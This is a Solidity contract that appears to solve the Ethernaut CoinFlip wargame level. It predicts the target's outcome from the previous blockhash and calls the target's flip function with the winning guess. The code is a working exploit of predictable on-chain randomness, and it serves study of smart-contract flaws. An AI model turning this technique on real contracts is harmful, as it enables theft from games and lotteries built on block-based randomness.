pragma solidity ^0.8.0;

// Ethernaut level 3 exploit
contract CoinFlipExploiter {
    address public instance;
    uint256 public factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address instanceAddress) {
        instance = instanceAddress;
    }

    // Calculate correct guess based on predicted logic
    function exploit() external returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / factor;
        bool correctGuess = coinFlip == 1 ? true : false;

        (bool success, bytes memory returnData) = instance.call(
            abi.encodeWithSelector(0xedb5b517, correctGuess) // flip selector
        );
        return success;
    }

    // Helper to directly check the consecutive wins
    function getConsecutiveWins() external view returns (uint256) {
        (bool success, bytes memory data) = instance.staticcall(abi.encodeWithSelector(0xd26bdc07)); // consecutiveWins selector
        require(success, 'Call failed');
        return abi.decode(data, (uint256));
    }
}